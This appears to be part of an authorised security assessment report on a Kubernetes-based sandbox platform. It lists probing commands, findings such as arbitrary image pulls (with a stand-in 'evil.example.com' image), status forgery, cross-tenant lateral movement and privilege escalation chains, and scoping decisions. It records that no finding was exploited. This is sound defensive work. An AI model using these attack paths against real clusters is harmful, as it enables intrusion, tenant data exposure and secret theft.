## Methodology

### Static analysis sources

- `api/internal/server/router.go` for routes
- `pkg/apis/llmsafespace/v1/*.go` and `pkg/crds/*.yaml` for CRD schemas
- `charts/llmsafespace/templates/*.yaml` for RBAC, NetworkPolicy, Service exposure

- `frontend/src/`, `frontend/package.json`, `frontend/package-lock.json` for browser surface
- `api/migrations/*.sql` for DB-level secret storage
- `controller/internal/workspace/controller.go` for spec-to-pod-spec materialization

### Live cluster probing (RT-1.4)

Within the blast-radius rules from `phase-0-prod/README.md` (default ns + pentest fixture only):

- `kubectl exec` from a sandbox pod to verify pod-to-pod connectivity
- `curl` from sandbox to controller `/metrics`, controller `/readyz`, agentd peer endpoints, postgres TCP, kube-apiserver TCP
- `kubectl get netpol -A`, `kubectl get cnp,ccnp -A` to confirm zero policy enforcement
- `helm get manifest llmsafespace` to enumerate rendered Kubernetes objects
- `helm get values llmsafespace --all` to capture deployed configuration

## Key findings (from the consolidated inventory)

### Headline (Phase 2 priority)

1. **`Spec.Runtime` arbitrary image pull** (RT-1.2 F1.2.1) — `runtime: "evil.example.com/img:latest"` → kubelet pulls attacker image. No allowlist anywhere in CRD/webhook/controller. Single-request supply-chain compromise.

2. **Status forge → SSRF + pod-exec hijack** (RT-1.2 F1.2.2) — `Status.PodIP/PodName/PodNamespace` are trusted by API handlers. With `patch workspaces/status`, redirect proxy traffic and terminal sessions to attacker-chosen pods including `kube-system`.

3. **Cross-tenant lateral movement** (RT-1.4 F1.4.1) — verified by direct `kubectl exec` from sandbox A → sandbox B's agentd 4097: TCP open, HTTP 200 on `/v1/statusz`, full session metadata leaks across tenants.

4. **agentd `/v1/statusz` and `/v1/healthz` unauthenticated** (RT-1.4 F1.4.2) — even post-G16 (NetworkPolicy isolation) these are reachable from the API pod. Path-based authz needs verifying.

5. **API SA `pods/exec` lacks label selector** (RT-1.3 F1.3.6) — API SA can exec into the controller pod, which holds a cluster-wide SA token. 2-stage privilege escalation: API namespaced token → controller cluster-wide token → cluster admin.

6. **API → sandbox secret reload over plain HTTP** (RT-1.7 F1.7.1) — `secrets.go:291` POSTs decrypted user secrets over `http://...:4097/v1/reload-secrets` with no TLS, no auth.

7. **API keys cleartext in DB** (RT-1.7 F1.7.2) — bearer tokens stored as plain strings; same string is the Redis cache key. Anyone with DB or Redis creds harvests live tokens.

8. **`autoApprovePermissions` schema drift** (RT-1.2 F1.2.6) — declared in Go but pruned from served CRD by apiserver. API code reads as if it could be true. Future "fix" without auth review = silent privilege escalation.

## Decisions worth recording

**1. Combined RT-1.5 and RT-1.6 into one report.**
Both audit dependencies; splitting them would have duplicated context (Go modules, npm, runtime images all share lineage). The combined report cross-references and is shorter.

**2. Live cluster probing kept to `default` ns and `pentest-control-fixture` ns only.**
Per blast-radius rules. No probing of `databases`, `home`, `flux-system`, etc. Cross-sandbox lateral movement was verified between two of MY OWN test sandboxes; no other tenant's data was accessed.

**3. SBOM generated by hand via Python rather than installing trivy/grype/syft.**
Tool installation in this environment timed out (slow network). Hand-rolling CycloneDX 1.5 from `go list -m -json all` + `package-lock.json` produced a valid SBOM in seconds. Container-image SBOM (which trivy/syft would generate by inspecting layers) deferred to Phase 1.5 on a calibrated workstation — captured as an explicit gap in the artefact.

**4. Reachability classification in CVE report.**
govulncheck distinguishes "reachable" (call-trace exists from our code to vuln symbol) from "imports-only" (vuln module is loaded but no call site reaches the vuln). The 56-reachable count is what Phase 2 should prioritize; the 171-imports-only count is what defenders should track for future code changes.

**5. Used parallel sub-agents for RT-1.5–1.9.**
RT-1.1 through RT-1.4 were sequential because each finding shaped the next (e.g. RT-1.1's `:sessionId` finding informed RT-1.2 lookups). RT-1.5 onward are independent layers; running them in parallel halved wall-clock time. Each sub-agent produced an independently-verifiable artefact at file:line precision.

**6. Did NOT attempt to exploit any finding.**
Phase 1 is reconnaissance. Several findings (T0.3 account recovery brute-force, T1.3 status forge, T2.4 postgres TCP exploit) were consciously left as "documented; reproducible by Phase 2" rather than "demonstrated working exploit." Reasons: blast-radius discipline; Phase 2 is where exploitation lives; some findings (T1.6 init-container shell injection) require destructive setup that's reserved for Phase 3.
